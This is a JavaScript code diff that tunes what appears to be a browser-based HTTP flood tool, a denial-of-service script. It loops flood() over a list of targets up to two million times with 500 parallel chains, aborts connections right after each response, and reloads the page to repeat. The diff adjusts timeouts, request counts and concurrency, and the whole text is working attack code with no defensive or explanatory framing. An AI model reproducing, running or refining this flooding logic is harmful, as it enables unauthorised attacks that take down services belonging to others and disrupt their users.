@@ -22,7 +22,7 @@ printStats()
 
 function fetchWithTimeout(resource) {
   const controller = new AbortController();
-  const id = setTimeout(() => controller.abort(), 1000);
+  const id = setTimeout(() => controller.abort(), 5000);
 
   return fetch(resource, {
     method: 'GET',
@@ -30,6 +30,7 @@ function fetchWithTimeout(resource) {
     signal: controller.signal
   }).then((response) => {
     clearTimeout(id);
+    controller.abort();
     return response;
   }).catch((error) => {
     clearTimeout(id);
@@ -56,18 +57,18 @@ setTimeout(() => {
   }
 
   function run() {
-    if (id === 5000000) {
+    if (id === 2000000) {
       setTimeout(() => location.href = '?'+Date.now(), 5000)
     } else {
       id++;
 
-      if (id < 5000000) {
+      if (id < 2000000) {
         flood(targets[id % targets.length], id).finally(run)
       }
     }
   }
 
-  for (let i = 0; i < 1000; i++) {
+  for (let i = 0; i < 500; i++) {
     run();
   }
 
